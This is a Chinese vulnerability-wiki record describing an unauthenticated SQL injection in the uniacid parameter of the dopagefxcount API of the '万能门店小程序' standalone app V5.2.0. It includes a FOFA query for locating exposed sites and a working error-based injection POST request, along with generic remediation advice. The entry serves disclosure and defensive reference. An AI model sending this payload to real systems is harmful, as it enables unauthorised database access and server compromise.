---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "万能门店小程序独立版 dopagefxcount uniacid SQL注入"
product: "万能门店小程序独立版"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "V5.2.0；MySQL GTID_SUBSET适用版本"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F%20dopagefxcount%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/comhome/cases/index.html\""
fofa_unverified: "body="
id: "vw-07fff8fc1b5c6f179eabde42"
entity_id: "ve-07fff8fc1b5c6f179eabde42"
schema_version: "1"
---

# 万能门店小程序独立版 dopagefxcount uniacid SQL注入

## 条目说明

- 对象与具体问题：万能门店小程序独立版；dopagefxcount uniacid SQL注入
- 版本、配置及部署条件：V5.2.0；MySQL GTID_SUBSET适用版本
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 无返回或源码，GTID错误消息需给实际MD5证据
- 在野已知和官方补丁无来源，SQLi到服务器写代码的条件未展开
- HTTP无围栏，修复仅泛建议

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

万能门店小程序 在/dopagefxcount接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

## 影响版本

万能门店小程序全开源独立版V5.2.0

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/comhome/cases/index.html"

POC/EXP：

```http
POST /api/wxapps/dopagefxcount HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1

uniacid=1 OR GTID_SUBSET(CONCAT((SELECT(md5('123')))),3119)-- 123&suid=1
```


## 漏洞修复

参数使用预编译形式用以对sql注入防护，同时限制接口参数输入。

下载官方补丁进行修复


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
